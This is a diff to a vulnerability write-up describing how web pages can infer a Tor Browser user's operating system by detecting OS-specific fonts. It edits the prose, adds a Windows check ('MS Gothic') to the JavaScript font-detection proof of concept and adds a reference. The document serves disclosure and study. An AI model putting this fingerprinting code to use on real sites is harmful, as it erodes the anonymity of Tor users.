@@ -13,11 +13,11 @@ Through the rendering of some specific Fonts, I discovered that it is possible t
 
 ### Description
 
-The Tor browser is based on Firefox, with its peculiarities and promises of digital privacy/anonymity, in addition to all its engineering to hide the IP from its user, Tor also promises to combat identifications that are linked to a person’s operating system, such for example: techniques that use JavaScript to capture the screen size and identify a unique feature of it.
+The Tor browser is based on Firefox, with its peculiarities and digital privacy/anonymity promises, in addition to all its engineering to hide the IP from its user, Tor also promises to combat identifications that are linked to a person’s operating system, such for example: techniques that use JavaScript to capture the screen size and identify a unique feature of it.
 
 However, it is possible to find out the operating system of a person using Tor via a technique that makes use of Fonts "exclusive" to some operating systems.
 
-For example, the font “Lucida Grande” is one of them, which by default is only installed on MacOS, so when an HTML page tries to render it and is successful it can be concluded that that user is using “Tor on a MacOS”, already an example to identify users “Tor on Windows” would be the font “Comic Sans MS” among many other examples.
+For example, the font “Lucida Grande” is one of them, which by default is only installed on MacOS, so when an HTML page tries to render it and is successful it can be concluded that that user is using “Tor on a MacOS”, already an example to identify users “Tor on Windows” would be the font “MS Gothic” among many other examples.
 
 After reporting this problem, I was told that the Tor Project is already aware of all of this, and some implementations are already present in the current version of Tor to reduce the impact of this vulnerability and there are also plans for the future so that it ceases to exist for complete.
 
@@ -45,15 +45,15 @@ Exploit:
         (function (document) {
             var width;
             var body = document.body;
+            var container = document.createElement("span");
 
-            var container = document.createElement('span');
-            container.innerHTML = Array(100).join('wi');
+            container.innerHTML = Array(100).join("wi");
             container.style.cssText = [
-                'position:absolute',
-                'width:auto',
-                'font-size:128px',
-                'left:-99999px'
-            ].join(' !important;');
+                "position: absolute",
+                "width: auto",
+                "font-size: 128px",
+                "left: -99999px"
+            ].join(" !important;");
 
             var getWidth = function (fontFamily) {
                 container.style.fontFamily = fontFamily;
@@ -65,25 +65,27 @@ Exploit:
                 return width;
             };
 
-            // Pre compute the widths of monospace, serif & sans-serif
-            // to improve performance.
-            var monoWidth  = getWidth('monospace');
-            var serifWidth = getWidth('serif');
-            var sansWidth  = getWidth('sans-serif');
+            var monoWidth  = getWidth("monospace");
+            var serifWidth = getWidth("serif");
+            var sansWidth  = getWidth("sans-serif");
 
             window.isFontAvailable = function (font) {
-                return monoWidth !== getWidth(font + ',monospace') ||
-                sansWidth !== getWidth(font + ',sans-serif') ||
-                serifWidth !== getWidth(font + ',serif');
+                return monoWidth !== getWidth(font + ",monospace") ||
+                sansWidth !== getWidth(font + ",sans-serif") ||
+                serifWidth !== getWidth(font + ",serif");
             };
         })(document);
 
-        if (isFontAvailable('Lucida Grande')) {
-            alert('You are using the MacOS plataform');
+        if (isFontAvailable("Lucida Grande")) {
+            alert("You are using the MacOS plataform");
+        }
+
+        else if (isFontAvailable("MS Gothic")) {
+            alert("You are using the Windows plataform");
         }
 
         else {
-            alert('You are not using the MacOs Platform');
+            alert("You are not using the MacOs/Windows Platform");
         }
     </script>
 </html>
@@ -120,3 +122,4 @@ This vulnerability can be combined with others to develop a profile unique enoug
 * [https://en.wikipedia.org/wiki/Tor_(anonymity_network)](https://en.wikipedia.org/wiki/Tor_(anonymity_network))
 * [https://2019.www.torproject.org/projects/torbrowser/design/](https://2019.www.torproject.org/projects/torbrowser/design/)
 * [https://gitlab.torproject.org/tpo/applications/tor-browser/-/issues/18097](https://gitlab.torproject.org/tpo/applications/tor-browser/-/issues/18097)
+* [https://www.samclarke.com/javascript-is-font-available/](https://www.samclarke.com/javascript-is-font-available/)
